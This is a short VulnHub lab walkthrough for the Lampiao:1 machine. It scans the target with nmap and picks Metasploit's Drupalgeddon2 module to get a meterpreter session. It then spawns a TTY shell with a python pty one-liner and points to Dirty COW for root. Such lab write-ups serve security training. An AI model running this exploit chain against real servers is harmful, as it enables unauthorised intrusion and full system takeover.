# Breaking Lampiao:1
Download Link: https://www.vulnhub.com/entry/lampiao-1,249/

### Step 1: Namp scan
```bash
root@kali:~# nmap -p1000-2000 -A 192.168.172.3

Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-15 00:21 EDT
Nmap scan report for 192.168.172.3
Host is up (0.00069s latency).
Not shown: 1000 closed ports
PORT     STATE SERVICE VERSION
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Lampi\xC3\xA3o
MAC Address: 08:00:27:7B:F2:20 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 192.168.172.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.03 seconds
```
You can find drupal webserver hosted which is running on port 1898.
Let's check if it can be vulnerable to recently found drupal(  ) attacks.

Search metasploit for drupal related auxilary/exploits
```bash
# msfconsole
msf> search drupal

Matching Modules
================

   Name                                           Disclosure Date  Rank       Description
   ----                                           ---------------  ----       -----------
   auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Drupal OpenID External Entity Injection
   auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Drupal Views Module Users Enumeration
   exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  Drupal HTTP Parameter Key/Value SQL Injection
   exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Drupal CODER Module Remote Command Execution
   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Drupal Drupalgeddon 2 Forms API Property Injection
   exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Drupal RESTWS Module Remote PHP Code Execution
   exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution

```
Let's use `exploit/unix/webapp/drupal_drupalgeddon2` which can give us meterpreter connection.

After meterpreter session is established get the shell by running:
```
python -c "import pty;pty.spawn('/bin/bash')"
```

Run Linux Exploit Suggestor: https://github.com/mzet-/linux-exploit-suggester
and assess vulnerabilty for previlage escalation. We can see that there are bunch of vulnerabilities reported. Let's consider dirtycow for previlage escallation.

Dirty cow exploit script can be found here: https://www.exploit-db.com/exploits/40847/




